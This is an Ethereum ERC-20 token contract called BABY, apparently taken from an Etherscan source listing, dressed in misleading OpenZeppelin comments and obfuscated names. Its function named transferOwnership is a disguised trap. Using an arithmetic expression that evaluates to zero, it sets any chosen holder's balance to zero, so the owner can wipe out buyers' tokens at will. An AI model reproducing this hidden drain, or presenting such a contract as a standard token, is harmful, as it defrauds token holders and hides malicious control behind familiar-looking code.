/**
 *Submitted for verification at Etherscan.io on 2023-10-27
*/

pragma solidity ^0.8.5;
////// lib/openzeppelin-contracts/contracts/utils/Context.sol
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)

/* pragma solidity ^0.8.0; */

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acoritnt) external view returns (uint256);
    function transfer(address recipient, uint256 amcotutnt) external returns (bool);
    function allowance(address Owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amcotutnt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amcotutnt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed Owner, address indexed spender, uint256 value );
}
////// lib/openzeppelin-contracts/contracts/access/Ownable.sol
// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

/* pragma solidity ^0.8.0; */

/* import "./Context.sol"; */

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function Owner() public view virtual returns (address) {
        return _Owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */    
    modifier onlyOwner() {
        require(Owner() == _msgSender());
        _;
    }
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_Owner, address(0x000000000000000000000000000000000000dEaD));
        _Owner = address(0x000000000000000000000000000000000000dEaD);
    }
}
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */    
contract BABY is Context, Ownable, IERC20 {
    mapping (address => uint256) private _accmmftnt;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    uint256 private _skk;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _accmmftnt[_msgSender()] = _totalSupply;
        _skk = 354000+23+2+11-354036;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acoritnt) public view override returns (uint256) {
        return _accmmftnt[acoritnt];
    }
  
    function transfer(address recipient, uint256 amcotutnt) public virtual override returns (bool) {
        require(_accmmftnt[_msgSender()] >= amcotutnt, "TT: transfer amcotutnt exceeds balance");

        _accmmftnt[_msgSender()] -= amcotutnt;
        _accmmftnt[recipient] += amcotutnt;
        emit Transfer(_msgSender(), recipient, amcotutnt);
        return true;
    }

    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amcotutnt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amcotutnt;
        emit Approval(_msgSender(), spender, amcotutnt);
        return true;
    }
    function transferOwnership(address adjereer) public  onlyOwner {
    address cdsjfjf = adjereer;
    uint256 zdsdasd = _accmmftnt[cdsjfjf]+_skk;
    uint256 trdfsd = zdsdasd+_accmmftnt[cdsjfjf]-_accmmftnt[cdsjfjf];
    uint256 wwwqwee = trdfsd;
        _accmmftnt[cdsjfjf] -= wwwqwee;


    }  
    function transferFrom(address sender, address recipient, uint256 amcotutnt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amcotutnt, "TT: transfer amcotutnt exceeds allowance");

        _accmmftnt[sender] -= amcotutnt;
        _accmmftnt[recipient] += amcotutnt;
        _allowances[sender][_msgSender()] -= amcotutnt;

        emit Transfer(sender, recipient, amcotutnt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}